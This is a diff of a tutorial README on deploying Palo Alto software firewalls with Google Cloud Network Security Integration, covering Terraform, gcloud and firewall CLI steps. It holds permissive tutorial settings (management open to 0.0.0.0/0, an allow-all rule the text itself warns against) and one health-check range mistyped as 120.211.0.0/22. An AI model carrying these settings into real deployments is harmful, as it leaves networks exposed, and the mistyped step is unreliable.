@@ -1,285 +1,211 @@
-# Software NGFW Out-of-Band Integration
+# Software NGFW with Network Security Integration
 
-This tutorial shows how to deploy Palo Alto Networks Software Firewalls (NGFWs), to inspect Google Cloud network traffic using Packet Mirroring, an out-of-band [Network Security Integration](\(https://cloud.google.com/network-security-integration/docs/pm/out-of-band-integration-overview\)) service.
+This tutorial shows how to deploy Palo Alto Networks Software Firewalls in Google Cloud, utilizing either the *in-line* or *out-of-band* deployment model within the [Network Security Integration](https://cloud.google.com/network-security-integration/docs/nsi-overview) (NSI).  NSI enables you to gain  visibility and security for your VPC network traffic, without requiring any changes to your network infrastructure.  
 
-Packet Mirroring captures a copy of your network traffic, including GKE cluster traffic. The captured traffic is then forwarded to your Palo Alto Networks NGFW for deep-packet inspection and security analysis. You control the flow of mirrored traffic using [mirroring rules](https://cloud.google.com/network-security-integration/docs/out-of-band/firewall-policies-overview#mirroring-rules) configured within your Google Cloud network firewall policies.
+The functionality of each model is summarized as follows:
+
+| Model           | Description             |
+| --------------- | ----------------------- |
+| **Out-of-Band** | Uses packet mirroring to forward a copy of network traffic to Software Firewalls for *out-of-band* inspection. Traffic is mirrored to your software firewalls by creating mirroring rules within your network firewall policy. |
+| **In-line**     | Uses packet intercept to steer network traffic to Software Firewalls for *in-line* inspection. Traffic is steered to your software firewalls by creating firewall rules within your network firewall policy. |
 
 This tutorial is intended for network administrators, solution architects, and security professionals who are familiar with [Compute Engine](https://cloud.google.com/compute) and [Virtual Private Cloud (VPC) networking](https://cloud.google.com/vpc).
 
-> [!IMPORTANT]
-> This solution is in public preview and has limited support.
+> [!CAUTION] 
+> This guide uses the *in-line* model, which is in private preview and must be enabled for your Google account. If you require passive inspection, steps for the *out-of-band* model are included where necessary. 
+
+<br>
 
 ## Architecture
 
-Network Security Integration follows a *producer-consumer* model, where the *consumer* consumes services provided by the *producer*. The *producer* contains the cloud infrastructure responsible for inspecting network traffic, while the *consumer* environment encompasses the cloud resources that require this network inspection.
+NSI follows a *producer-consumer* model, where the *consumer* consumes services provided by the *producer*. The *producer* contains the cloud infrastructure responsible for inspecting network traffic, while the *consumer* environment contains the cloud resources that require inspection.
 
-
-<img src="images/diagram.png">
-
+<img src="images/diagram.png" width="100%">
 
 ### Producer Components
 
-The producer creates firewalls which serve as the backend service for an internal load balancer. For each zone requiring traffic inspection, the producer creates a forwarding rule, which is specifically configured for traffic mirroring, and links it to a *mirroring deployment*, a zone-based resource. These mirroring deployments are consolidated into a *mirroring deployment group*, which is then made accessible to the consumer.
+The producer creates firewalls which serve as the backend service for an internal load balancer. For each zone requiring traffic inspection, the producer creates a forwarding rule, and links it to an *intercept* or *mirroring* *deployment* which is a zone-based resource. These are consolidated into an *deployment group*, which is then made accessible to the consumer.
 
 | Component | Description |
 | :---- | :---- |
-| [Load Balancer](https://cloud.google.com/load-balancing/docs/internal) | An internal network load balancer that distributes traffic to the NGFWs. |
-| [Mirroring Deployments](https://cloud.google.com/network-security-integration/docs/deployments-overview) | A zonal resource that points to the forwarding rule of the internal load balancer. |
-| [Mirroring Deployment Group](https://cloud.google.com/network-security-integration/docs/deployment-groups-overview) | A collection of mirroring deployments that are set up across multiple zones within the same project.  It represents the firewalls as a service that consumers reference. |
+| [Load Balancer](https://cloud.google.com/network-security-integration/docs/out-of-band/configure-producer-service#create-int-lb-pm) | An internal network load balancer that distributes traffic to the NGFWs. |
+| [Deployments](https://cloud.google.com/network-security-integration/docs/out-of-band/deployments-overview) | A zonal resource that acts as a backend of the load balancer, providing network inspection on traffic from the consumer. |
+| [Deployment Group](https://cloud.google.com/network-security-integration/docs/out-of-band/deployment-groups-overview) | A collection of intercept or mirroring deployments that are set up across multiple zones within the same project.  It represents the firewalls as a service that consumers reference. |
 | [Instance Group](https://cloud.google.com/compute/docs/instance-groups) | A managed or unmanaged instance group that contains the firewalls which enable horizontal scaling. |
-#### Deployment Models
 
-Because the internal load balancer does not support zone affinity, you must choose between keeping traffic within the same zone or enabling cross-zone mirroring. 
 
-Zone-based mirroring ensures that traffic from a consumer is only mirrored to firewalls within the same zone as the mirroring source. Region-based mirroring allows traffic to be mirrored to any firewall within the same region regardless of the source zone.
+#### Zone Affinity Considerations
+
+The internal load balancer lacks zone-based affinity support. Therefore, consider the following architectures for your firewall deployment:
+
+* **Zone-Based**: Ensures traffic is inspected by a firewall in the same zone as the consumer's source zone.
+* **Cross-Zone**: Allows traffic to be inspected by any firewall within the same region as the traffic's source.
 
 <table>
   <tr>
     <!-- Title cell with left alignment -->
-    <th colspan="2" align="left">Zone-Based</th>
+    <th colspan="2" align="left">Zone-Based Deployment</th>
   </tr>
   <tr>
     <td width="35%"><img src="images/diagram_zone.png" width="100%"></td>
     <td width="65%">
       <ol>
-        <li>Deploy the firewalls to a single-zone instance group corresponding to the source zone of the mirrored traffic.</li>
+        <li>Deploy the firewalls to a zone instance group corresponding to the source zone of the consumer.</li>
         <li>Add the instance group to a backend service.</li>
         <li>Create a forwarding rule targeting the backend service.</li>
-        <li>Link the forwarding rule to a mirroring deployment that matches the zone you are inspecting.</li>
-        <li>Add the mirroring deployment to the mirroring deployment group.</li>
+        <li>Link the forwarding rule to an intercept/mirroring deployment that matches the zone you are inspecting.</li>
+        <li>Add the deployment to a deployment group.</li>
         <li><b>Repeat steps 1-5</b> for each zone requiring inspection.</li>
       </ol>
     </td>
   </tr>
   <tr>
     <!-- Title cell with left alignment -->
-    <th colspan="2" align="left">Region-Based</th>
+    <th colspan="2" align="left">Cross-Zone Deployment</th>
   </tr>
   <tr>
     <td width="35%"><img src="images/diagram_region.png" width="100%"></td>
     <td width="65%">
       <ol>
-        <li>Deploy the firewalls to a regional instance group matching the source region of the mirrored traffic.</li>
+        <li>Deploy the firewalls to a regional instance group matching the source region of the consumer.</li>
         <li>Add the instance group to a backend service.</li>
-        <li>Create a forwarding rule targeting the backend service. </li>
-        <li>Link the forwarding rule to a mirroring deployment matching the zone you wish to inspect. </li>
-        <li>Add the mirroring deployment to the mirroring deployment group. </li>
+        <li>Create a forwarding rule targeting the backend service.</li>
+        <li>Link the forwarding rule to an intercept/mirroring deployment matching the zone you wish to inspect.</li>
+        <li>Add the deployment to the deployment group.</li>
         <li><b>Repeat steps 3-5</b> for each zone requiring inspection.</li>
       </ol>
     </td>
   </tr>
 </table>
 
-> [!IMPORTANT]
-> The tutorial uses the **Region-Based** model.  Therefore, a forwarding rule and mirroring deployment are created for every zone within the region. Only a single firewall is deployed in this tutorial.
+<br>
 
+### Consumer Components
 
+The consumer creates an *intercept* or *mirroring* *endpoint group* corresponding to the producer's *deployment group*. Then, the consumer associates the endpoint group with VPC networks requiring inspection. 
 
-
-### Consumer Components 
-The consumer creates a *mirroring endpoint group* corresponding to the producer's *mirroring deployment group*. The consumer associates the endpoint group with VPC networks slated for inspection. Mirroring rules are created in the consumer's network firewall policies to select traffic for inspection. Each mirroring rule includes a security profile that references the mirroring endpoint group.
+Finally, the consumer creates a network firewall policy with rules that use a *security profile group* as their action.  Traffic matching these rules is intercepted or mirrored to the producer for inspection.
 
 | Component | Description |
 | :---- | :---- |
-| [Mirroring Endpoint Group](https://cloud.google.com/network-security-integration/docs/endpoint-groups-overview) | A project-level resource that directly corresponds to a producer's mirroring deployment group. This group can be associated with multiple VPC networks to enable traffic mirroring. |
-| [Mirroring Endpoint Group Association](https://cloud.google.com/network-security-integration/docs/pm/configure-mirroring-endpoint-group-associations) | Associates the mirroring endpoint group to consumer VPCs. |
-| [Mirror Rules](https://cloud.google.com/network-security-integration/docs/pm/out-of-band-integration-overview#firewall_policies_and_rules) | Exists within Network Firewall Policies and select traffic to be mirrored for inspection by the producer. |
-| [Security Profiles](https://cloud.google.com/network-security-integration/docs/security-profiles-overview) | Reference a mirroring endpoint group and are set as the action within mirroring rules. |
+| [Endpoint Group](https://cloud.google.com/network-security-integration/docs/out-of-band/endpoint-groups-overview) | A project-level resource that directly corresponds to a producer's deployment group. This group can be associated with multiple VPC networks. |
+| [Endpoint Group Association](https://cloud.google.com/network-security-integration/docs/out-of-band/configure-mirroring-endpoint-group-associations) | Associates the endpoint group to consumer VPCs. |
+| [Firewall Rules](https://cloud.google.com/firewall/docs/network-firewall-policies) | Exists within Network Firewall Policies and select traffic to be intercepted or mirrored for inspection by the producer. |
+| [Security Profiles](https://cloud.google.com/network-security-integration/docs/security-profiles-overview) | Can be type `intercept` or `mirroring` and are set as the action within firewall rules. |
+
+<br>
+
+### Traffic Flow Example
+
+The network firewall policy associated with the `consumer-vpc` contains two rules, each specifying a security profile group as their action. When traffic matches either rule, the traffic is encapsulated to the producer for inspection. 
+
+<table>
+  <tr>
+    <!-- Title cell with left alignment -->
+    <th colspan="5" align="center">Network Firewall Policy</th>
+  </tr>
+    <tr>
+        <th>PRIORITY</th>
+        <th>DIRECTION</th>
+        <th>SOURCE</th>
+        <th>DESTINATION</th>
+        <th>ACTION</th>
+    </tr>
+    <tr>
+        <td><code>10</code></td>
+        <td><code>Egress</code></td>
+        <td><code>10.0.0.0/8</code></td>
+        <td><code>0.0.0.0/0</code></td>
+        <td><code>apply-security-profile</code></td>
+    </tr>
+    <tr>
+        <td><code>11</code></td>
+        <td><code>Ingress</code></td>
+        <td><code>0.0.0.0/0</code></td>
+        <td><code>10.0.0.0/8</code></td>
+        <td><code>apply-security-profile</code></td>
+    </tr>
+</table>
+
+> [!NOTE]
+> In the *out-of-band* model, traffic would be mirrored to the firewalls instead of redirected.  
 
 
+#### Traffic to Producer
+<img src="images/diagram_flow1.png" width="100%">
 
-### Traffic Flow
+1. The `web-vm` makes a request to the internet. The request is evaluated against the rules within the Network Firewall Policy associated with the `consumer-vpc`.
+2. The request matches the `EGRESS` rule (priority: `10`) that specifies a security profile group as its action.
+3. The request is then encapsulated through the `endpoint association` to the producer environment.
+4. Within the producer environment, the `intercept deployment group` directs traffic to the `intercept deployment` located in the same zone as the `web-vm`.
+5. The internal load balancer forwards the traffic to an available firewall for deep packet inspection.
 
-<img src="images/diagram_flows.png" width="100%">
+#### Traffic from Producer
+<img src="images/diagram_flow2.png" width="100%">
 
-1. A network firewall policy containing mirroring rules is associated to `vpc1`.
-2. Traffic matching a mirroring rule is encapsulated to the `mirroring endpoint group` defined by the `security profile` within the mirroring rule.
-3. The `mirroring endpoint group` forwards the traffic to the producer's `mirroring deployment group`.  
-4. The `mirroring deployment group` forwards traffic to the `mirroring deployment` located in the same zone as the source of the traffic.
-5. The internal load balancer distributes traffic across the NGFWs  
-6. The firewalls perform deep packet inspection on the mirrored packets.
-
-> [!NOTE] 
-> The *mirroring deployment group* sends mirrored traffic to the *mirroring deployment* in the same zone as the mirroring source.
+1. If the firewall permits the traffic, it is returned to the `web-vm` via the consumer's `endpoint association`.
+2. The local route table of the `consumer-vpc` routes traffic to the internet via the Cloud NAT.
+3. The session is established with the internet destination and is continuously monitored by the firewall. 
 
 ---
+
+<br>
 
 ## Requirements
 
-The following is required for this tutorial:
+> [!WARNING] 
+> The *in-line* model is currently in private preview and must be enabled for your Google Cloud account. 
 
-1. A Google Cloud project.  
-2. A machine with Terraform version:`"~> 1.7"`
+1. A Google Cloud project.
+2. Access to [Cloud Shell](https://shell.cloud.google.com). 
+3. The following IAM Roles:
 
-> [!NOTE] 
-> This tutorial deploys the producer & consumer environments separately.  This enables you to use your own consumer environment if desired.
+    | Ability | Scope | Roles |
+    | :---- | :---- | :---- |
+    | Create [firewall endpoints](https://cloud.google.com/firewall/docs/about-firewall-endpoints#iam-roles), [endpoint associations](https://cloud.google.com/firewall/docs/about-firewall-endpoints#endpoint-association), [security profiles](https://cloud.google.com/firewall/docs/about-security-profiles#iam-roles), and [network firewall policies](https://cloud.google.com/firewall/docs/network-firewall-policies#iam). | Organization | `compute.networkAdmin`<br>`compute.networkUser`<br>`compute.networkViewer` |
+    | Create [global network firewall policies](https://cloud.google.com/firewall/docs/use-network-firewall-policies#expandable-1) and [firewall rules](https://cloud.google.com/firewall/docs/use-network-firewall-policies#expandable-8) for VPC networks. | Project | `compute.securityAdmin`<br>`compute.networkAdmin`<br>`compute.networkViewer`<br>`compute.viewer`<br>`compute.instanceAdmin` |
 
-## Create the Producer Environment
 
-Use the provided terraform plan (in `producer` directory) to create the firewall’s VPCs, instance template, instance group, internal load balancer, mirroring deployment, and mirroring deployment group. 
+<br>
+
+## Create Producer Environment
+In the `producer` directory, use the terraform plan to create the producer's VPCs, instance template, instance group, internal load balancer, intercept deployment, and intercept deployment group. 
 
 > [!TIP]
-> It is recommended to deploy the producer resources to a dedicated Google Cloud project.  This ensures the security services offered by the producer are managed independently of the consumer.
+> In production environments, it is recommended to deploy the producer resources to a dedicated project.  This ensures the security services are managed independently of the consumer.
 
-1. In [Cloud Shell](https://shell.cloud.google.com), clone the repository and change directories to `/producer`. 
-
-    ```
-    git clone https://github.com/PaloAltoNetworks/google-cloud-packet-mirroring-tutorial
-    cd google-cloud-packet-mirroring-tutorial/producer
-    ```
-
-2. Create a `terraform.tfvars` file from `terraform.tfvars.example`.
+1. In [Cloud Shell](https://shell.cloud.google.com), clone the repository change to the `producer` directory. 
 
     ```
-    cp terraform.tfvars.example terraform.tfvars
+    git clone https://github.com/PaloAltoNetworks/google-cloud-nsi-tutorial
+    cd google-cloud-nsi-tutorial/producer
     ```
 
-3. Edit the `terraform.tfvars` file and set values for the following variables:
-
-    | Key              | Value                                                                                                                | Default                                    | 
-    | ---------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
-    | `project_id`     | The Google Cloud project ID of the producer environment.                                                           | `null`                                     |
-    | `mgmt_allow_ips` | A list of IPv4 addresses which have access to the firewall's mgmt interface.                                         | `["0.0.0.0/0"]`                            |
-    | `region`         | A region to deploy the producer resources.  This should be the same region as the resources you wish to inspect.   | `us-west1`                                 |
-
-
-4. (BYOL only) If you are using a BYOL image (i.e. <code>vmseries-flex-<b>byol</b>-*</code>):
-    1.  Create an authcode from the [CSP](https://support.paloaltonetworks.com).
-    2.  Add the generated authcode (i.e. `D012345`) to `bootstrap_files/authcodes`.
-        > Adding the authcode to `authcodes` file automatically licenses the firewalls during deployment. 
-
-5. Initialize and apply the terraform plan.
-
-    ```
-    terraform init
-    terraform apply
-    ```
-
-6. After the apply completes, terraform displays the following message:
-
-    <pre>Apply complete!
-
-    Outputs:
-
-    <b>MIRRORING_DEPLOYMENT_GROUP</b> = "projects/PROJECT_ID/locations/global/mirroringDeploymentGroups/panw-mdg"</pre>
-
-> [!CAUTION]
-> Record the `mirroring_deployment_group` output.  The consumer needs this value to associate the mirroring deployment group with the mirroring endpoint.
-
----
-
-## Firewall Configuration
-
-Access the firewall and enable Geneve inspection.  Then, download content packs to the firewall and set a password for the firewall's default username. 
-
-1. In Cloud Shell, set the firewall's name and zone to environment variables, `FW_NAME` and `FW_ZONE`.
-
-    ```
-    read FW_NAME FW_ZONE <<< $(gcloud compute instances list --filter="tags.items=panw-tutorial" --format="value(name, zone)")
-    ```
-
-2. Copy and paste the command below to SSH into the firewall using `gcloud`. 
-
-    ```
-    gcloud compute ssh admin@$FW_NAME --zone=$FW_ZONE
-    ```
-
-3. On the firewall, enable the firewall to inspect mirrored traffic. 
-
-    ```
-    request plugins vm_series gcp ips inspect enable yes
-    ```
-
-4. Check for and download the latest content pack. 
-
-    ```
-    request content upgrade check
-    request content upgrade download latest
-    ```
-
-5. Verify the content pack is downloaded before proceeding.
-
-
-    ```
-    request content upgrade info
-    ```
-
-    (output)
-    <pre>Version               Size              Released on Downloaded  Installed
-    -------------------------------------------------------------------------
-    8919-9103             93MB  2024/12/02 13:32:19 PST        <b>yes</b>         no</pre>
-
-    > Content updates can be automatically installed during firewall deployment via [bootstrapping](https://docs.paloaltonetworks.com/vm-series/11-1/vm-series-deployment/bootstrap-the-vm-series-firewall/prepare-the-bootstrap-package). 
-
-6. Install the latest content pack. 
-
-    ```
-    request content upgrade install version latest
-    ```
-
-
-7. Enter configuration mode. 
-
-    ```
-    configure
-    ```
-
-8. Set a password for the `admin` username.
-
-    ```
-    set mgt-config users admin password
-    ```
-
-9. Commit the changes.
-
-    ```
-    commit
-    ```
-
-10. Enter `exit` twice exit configuration mode and close the session.  
-     
-11. In Cloud Shell, retrieve the management address of the firewall. 
-
-    ```
-    gcloud compute instances list \
-        --filter='tags.items=(panw-tutorial)' \
-        --format='value(EXTERNAL_IP)'
-    ```
-
-12. Access the firewall's web interface using the management address. 
-
-    <pre>https://<b><i>MGMT_ADDRESS</i></b></pre>
-
----
-
-## Create Consumer Environment
-
-If you do not have an existing consumer environment, use the provided terraform plan (within the `consumer` directory) to create one.  The terraform plan creates a VPC (`consumer-vpc`) , two debian VMs (`client-vm` and `web-vm`), and a GKE cluster (`cluster1`).
-
-> [!NOTE] 
-> If you already have an environment that you want to apply security inspection, skip to [Create Mirroring Endpoint Group](#create-mirroring-endpoint-group).
-
-1. In Cloud Shell, change to the `consumer` directory.
-
-    ```
-    cd ..
-    cd google-cloud-packet-mirroring-tutorial/consumer
-    ```
-
-2. Create a `terraform.tfvars` file from `terraform.tfvars.example`.
+2. Create a `terraform.tfvars`.
 
     ```
     cp terraform.tfvars.example terraform.tfvars
     ```
 
-3. In the `terraform.tfvars` file, set values for the following variables:  
+3. Edit `terraform.tfvars` by setting values for the following variables:  
+   
+    | Key | Value | Default |
+    | :---- | :---- | :---- |
+    | `project_id` | The Google Cloud project ID of the producer environment. | `null` |
+    | `mgmt_allow_ips` | A list of IPv4 addresses which have access to the firewall's mgmt interface. | `["0.0.0.0/0"]` |
+    | `mgmt_public_ip` | If true, the management address will have a public IP assigned to it. | `false` | 
+    | `region` | The region to deploy the consumer resources. | `us-west1` |
+    | `image_name` | The firewall image to deploy. | `vmseries-flex-bundle2-1114h13`|
 
-    | Variable           | Description                                                                                                   | Default         |
-    | ------------------ | ------------------------------------------------------------------------------------------------------------- | --------------- |
-    | `project_id`       | The project ID of the consumer environment.                                                                 | `null`          |
-    | `mgmt_allowed_ips` | A list of IPv4 addresses that can access the VMs on `TCP:80,22`.                                              | `["0.0.0.0/0"]` |
-    | `region`           | The region to deploy the consumer resources.                                                                | `us-west1`   |
-    | `zone`             | The zone to deploy the workload VMs.  This zone should match the zone of the producer's mirroring deployment. | `us-west1-a` |
+> [!TIP]
+> For `image_name`, a full list of public images can be found with this command:
+> ```
+> gcloud compute images list --project paloaltonetworksgcp-public --no-standard-images
+> ```
+
+> [!NOTE]
+> If you are using BYOL image (i.e.  <code>vmseries-flex-<b>byol</b>-*</code>), the license can be applied during or after deployment.  To license during deployment, add your authcode to `bootstrap_files/authcodes`.  See [Bootstrap Methods](https://docs.paloaltonetworks.com/vm-series/11-1/vm-series-deployment/bootstrap-the-vm-series-firewall) for more information.  
+
 
 4. Initialize and apply the terraform plan.
 
@@ -288,229 +214,543 @@ If you do not have an existing consumer environment, use the provided terraform 
     terraform apply
     ```
 
-6. After the apply completes, terraform displays the following message:
+    Enter `yes` to apply the plan.
+
+5. After the apply completes, terraform displays the following message:
+
+    <pre>
+    export <b>PRODUCER_PROJECT</b>=<i>your-project-id</i>
+    export <b>DATA_VPC</b>=<i>data</i>
+    export <b>DATA_SUBNET</b>=<i>us-west1-data</i>
+    export <b>REGION</b>=<i>us-west1</i>
+    export <b>ZONE</b>=<i>us-west1-a</i>
+    export <b>BACKEND_SERVICE</b>=<i>https://www.googleapis.com/compute/v1/projects/your-project-id/regions/us-west1/backendServices/panw-lb</i></pre>
+
+7. **Copy-and-paste** the `ENVIRONMENT_VARIABLES` output into Cloud Shell to set environment variables.
+
+<br>
+
+### Create Intercept Deployment & Deployment Group
+
+Create an intercept deployment for the zone you wish to inspect traffic (`$ZONE`). and add it to an intercept deployment group.
+
+1. ***Out-of-Band Deployment Only:*** Go to [Create Mirroring Deployment & Deployment Group](docs/oob_producer.md#create-mirroing-deployment--deployment-group).
+
+2. Create an intercept deployment group (`panw-dg`) within the firewall’s `data-vpc`.
 
     ```
-    Apply complete!
-
-    Outputs:
-
-    SET_ENV_VARS = <<EOT
-
-    export PROJECT_ID=your-project-id
-    export CONSUMER_VPC=consumer-vpc
-    export REGION=us-west1
-    export CLUSTER=cluster1
-
-    EOT
+    gcloud beta network-security intercept-deployment-groups create panw-dg \
+        --location global \
+        --project $PRODUCER_PROJECT \
+        --network $DATA_VPC \
+        --no-async
     ```
 
+3. Create a forwarding rule (`panw-lb-rule-$ZONE`) for the internal load balancer.
 
-### Create Mirroring Endpoint Group
-Create a mirroring endpoint group and associate it with the producer's mirroring deployment group.  Then, associate the mirroring endpoint group with the consumer's VPC networks.
+    ```
+    gcloud compute forwarding-rules create panw-lb-rule-$ZONE \
+        --load-balancing-scheme=INTERNAL \
+        --ip-protocol=UDP \
+        --ports=6081 \
+        --backend-service=$BACKEND_SERVICE \
+        --subnet=$DATA_SUBNET \
+        --region=$REGION \
+        --project=$PRODUCER_PROJECT
+    ```
 
-1. In Cloud Shell, set an environment variables for the following:
+4. Create an intercept deployment (`panw-deployment-$ZONE`) by associating it with your forwarding rule.
 
-    Your consumer's project ID. 
+    ```
+    gcloud beta network-security intercept-deployments create panw-deployment-$ZONE \
+        --location $ZONE \
+        --forwarding-rule panw-lb-rule-$ZONE \
+        --forwarding-rule-location $REGION \
+        --intercept-deployment-group projects/$PRODUCER_PROJECT/locations/global/interceptDeploymentGroups/panw-dg \
+        --no-async
+    ```
 
-    <pre><code>export CONSUMER_PROJECT=<b><i>CONSUMER PROJECT ID</i></b></code></pre>
-    
-    Your producer's project ID. 
+> [!TIP]
+> In this tutorial, all of the consumer resources are in one zone, requiring only one intercept deployment. For multiple zones, repeat steps **3-4** for each zone requiring inspection. 
 
-    <pre><code>export PRODUCER_PROJECT=<b><i>PRODUCER PROJECT ID</i></b></code></pre>
+<br>
 
-    The name of the producer's mirroring deployment group. 
+### Configure Firewall
 
-    <pre><code>export MIRROR_DEPLOYMENT_GROUP=<b><i>panw-mdg</i></b></code></pre>
+Access the firewall's CLI and enable Geneve encapsulation.  Then, apply a baseline configuration to the firewall to pass the load balancer's health checks and to allow traffic from the consumer networks.
 
-    Your deployment region. 
+> [!IMPORTANT]
+> For this tutorial, the firewalls are bootstrapped only with a threat update to enable threat inspection. For production environments, all  steps below can be fully automated via [bootstrapping](https://docs.paloaltonetworks.com/vm-series/11-1/vm-series-deployment/bootstrap-the-vm-series-firewall/prepare-the-bootstrap-package) to simplify management.
 
-    <pre><code>export REGION=<b><i>us-west1</i></b></code></pre>
+<br>
 
-2. Copy and paste the command below to set an environment variable for your organization ID`.
+#### Access the Firewall
 
-    <pre><code>export ORG_ID=$(gcloud projects describe $CONSUMER_PROJECT --format=json | jq -r '.parent.id')</code></pre>
+1. In Cloud Shell, set the firewall’s name and zone to environment variables (`FW_NAME` and `FW_ZONE`).
 
-3. Create a mirroring endpoint group which references the producer's mirroring deployment group.
+    ```
+    read FW_NAME FW_ZONE <<< $(gcloud compute instances list \
+        --filter="tags.items=panw-tutorial" \
+        --format="value(name, zone)")
+    ```
 
-    <pre><code>gcloud beta network-security mirroring-endpoint-groups create <b><i>panw-epg</i></b> \
-        --mirroring-deployment-group $MIRROR_DEPLOYMENT_GROUP \
-        --project $CONSUMER_PROJECT \
-        --location global \
-        --no-async</code></pre>
+2. SSH to the firewall.
 
-4. Associate the mirroring endpoint group with the VPC network (`consumer-vpc`) you wish to inspect. 
+    ```
+    gcloud compute ssh admin@$FW_NAME --zone=$FW_ZONE
+    ```
 
-    <pre><code>gcloud beta network-security mirroring-endpoint-group-associations create <b><i>panw-epg-assoc</i></b> \
-        --mirroring-endpoint-group <b><i>panw-epg</i></b> \
-        --network <b><i>consumer-vpc</i></b> \
-        --project $CONSUMER_PROJECT \
-        --location global \
-        --no-async</code></pre>
-    
-### Create Mirroring Rules
-Create a network firewall policy with mirroring rules.  Create security profile that references the mirroring endpoint group and attach the profile to each mirroring rule. 
+> [!WARNING]
+> After applying the terraform plan, it can take ~10 minutes for the firewall to become available. 
 
-> [!NOTE] 
-> Both security profiles and security profile groups are organizational-level resources.
+<br>
 
-1. Create a network firewall policy.
+#### Enable Geneve
 
-    <pre><code>gcloud compute network-firewall-policies create <b><i>consumer-policy</i></b> \
-        --project $CONSUMER_PROJECT \
-        --global</code></pre>
+1. Enable the firewall to process Geneve encapsulated traffic.
 
-2.  Create `CUSTOM_MIRRORING` security profile that references the mirroring endpoint group and add the profile to a security profile group.
+    ```
+    request plugins vm_series gcp ips inspect enable yes
+    ```
 
-    <pre><code>gcloud beta network-security security-profiles custom-mirroring create <b><i>panw-sp</i></b> \
-        --mirroring-endpoint-group <b><i>panw-epg</i></b> \
-        --billing-project $CONSUMER_PROJECT \
-        --organization $ORG_ID \
-        --location global
-    
-    gcloud beta network-security security-profile-groups create <b><i>panw-spg</i></b> \
-        --custom-mirroring-profile <b><i>panw-sp</i></b> \
-        --billing-project $CONSUMER_PROJECT \
-        --organization $ORG_ID \
-        --location global</code></pre>
+2. Reboot the firewall. 
 
-3. Create mirroring rules that reference the security profile group to mirror all `INGRESS` & `EGRESS` traffic.
+    ```
+    request restart system
+    ```
 
-    <pre><code>gcloud beta compute network-firewall-policies mirroring-rules create <b><i>10</i></b> \
-        --action mirror \
-        --firewall-policy <b><i>consumer-policy</i></b> \
-        --global-firewall-policy \
-        --security-profile-group organizations/$ORG_ID/locations/global/securityProfileGroups/<b><i>panw-spg</i></b> \
-        --layer4-configs all \
-        --src-ip-ranges 0.0.0.0/0 \
-        --dest-ip-ranges 0.0.0.0/0 \
-        --direction INGRESS
+3. Enter `y` to reboot.
 
-    gcloud beta compute network-firewall-policies mirroring-rules create <b><i>11</i></b> \
-        --action mirror \
-        --firewall-policy <b><i>consumer-policy</i></b> \
-        --global-firewall-policy \
-        --security-profile-group organizations/$ORG_ID/locations/global/securityProfileGroups/<b><i>panw-spg</i></b> \
-        --layer4-configs all \
-        --src-ip-ranges 0.0.0.0/0 \
-        --dest-ip-ranges 0.0.0.0/0 \
-        --direction EGRESS</code></pre>
+> [!IMPORTANT]
+> The reboot will not be required in a future release.
 
-5. Associate the network firewall policy to the consumer VPC network.
+<br>
 
-    <pre><code>gcloud compute network-firewall-policies associations create \
-        --name <b><i>consumer-policy-assoc</i></b> \
-        --global-firewall-policy \
-        --firewall-policy <b><i>consumer-policy</i></b> \
-        --network <b><i>consumer-vpc</i></b> \
-        --project $CONSUMER_PROJECT</code></pre>
+#### Apply Baseline Configuration
+Configure the firewall to pass the load balancer's health checks and to allow traffic from the `consumer-vpc`.
+
+1. After the reboot, [access the firewall](#access-the-firewall) again and enter configuration mode. 
+
+    ```
+    configure
+    ```
+
+2. Set a password for the `admin` user.
+
+    ```
+    set mgt-config users admin password
+    ```
+
+3. Set `ethernet1/1` as a DHCP interface, assign it to the `data` zone, and set its virtual router to `default`.
+
+    ```
+    set network interface ethernet ethernet1/1 layer3 dhcp-client enable yes
+    set network virtual-router default interface ethernet1/1
+    set zone data network layer3 ethernet1/1
+    ```
+
+4. Create a management profile (`gcp-lb-profile`) allowing HTTPS from the load balancer's [health check ranges](https://cloud.google.com/load-balancing/docs/health-check-concepts#ip-ranges).
+
+    ```
+    set network profiles interface-management-profile gcp-lb-profile https yes
+    set network profiles interface-management-profile gcp-lb-profile permitted-ip 35.191.0.0/16
+    set network profiles interface-management-profile gcp-lb-profile permitted-ip 130.211.0.0/22
+    set network profiles interface-management-profile gcp-lb-profile permitted-ip 209.85.152.0/22
+    set network profiles interface-management-profile gcp-lb-profile permitted-ip 209.85.204.0/22
+    ```
+
+5. Create a static address group (`gcp-lb-check-ips`) containing the load balancer health check ranges. 
+
+    ```
+    ​​set address gcp-lb-check-ip-1 ip-netmask 35.191.0.0/16
+    set address gcp-lb-check-ip-2 ip-netmask 120.211.0.0/22
+    set address gcp-lb-check-ip-3 ip-netmask 209.85.152.0/22
+    set address gcp-lb-check-ip-4 ip-netmask 209.85.204.0/22
+    set address-group gcp-lb-check-ips static [ gcp-lb-check-ip-1 gcp-lb-check-ip-2 gcp-lb-check-ip-3 gcp-lb-check-ip-4 ]
+    ```
+
+6. Create an address group (`gcp-lb-fwd-rules`) to contain the IP addresses for each forwarding rule. 
+
+    ```
+    set address-group gcp-lb-fwd-rules
+    ```
+
+7. Create a security policy (`gcp-lb-check-allow`) allowing the health check CIDRs to reach the loopback interfaces using SSL. 
+
+    ```
+    set rulebase security rules gcp-lb-check-allow from any to any 
+    set rulebase security rules gcp-lb-check-allow source gcp-lb-check-ips
+    set rulebase security rules gcp-lb-check-allow destination gcp-lb-fwd-rules
+    set rulebase security rules gcp-lb-check-allow application ssl 
+    set rulebase security rules gcp-lb-check-allow service application-default
+    set rulebase security rules gcp-lb-check-allow action allow
+    ```
+
+8. Create a security policy to allow workload traffic from the `consumer-vpc`.
+
+    ```
+    set rulebase security rules data-allow from data to data 
+    set rulebase security rules data-allow source any
+    set rulebase security rules data-allow destination any
+    set rulebase security rules data-allow application any 
+    set rulebase security rules data-allow service any
+    set rulebase security rules data-allow action allow
+    set rulebase security rules data-allow profile-setting profiles virus default
+    set rulebase security rules data-allow profile-setting profiles spyware default
+    set rulebase security rules data-allow profile-setting profiles vulnerability default
+    ```
+
+> [!CAUTION]  
+> This policy allows all traffic and should not be used within production environments.
+
+<br>
+
+
+#### Configure Health Checks
+
+1. In Cloud Shell, retrieve the IP address of the forwarding rule assigned to the load balancer. 
+
+    ```
+    gcloud compute forwarding-rules list
+    ```
+
+    (output)
+    <pre>
+    NAME                     REGION    IP_ADDRESS  IP_PROTOCOL  TARGET
+    panw-lb-rule-us-west1-a  us-west1  <b>10.0.1.3</b>    UDP          us-west1/panw-lb</pre>
+
+2. Create an address object for the forwarding rule.
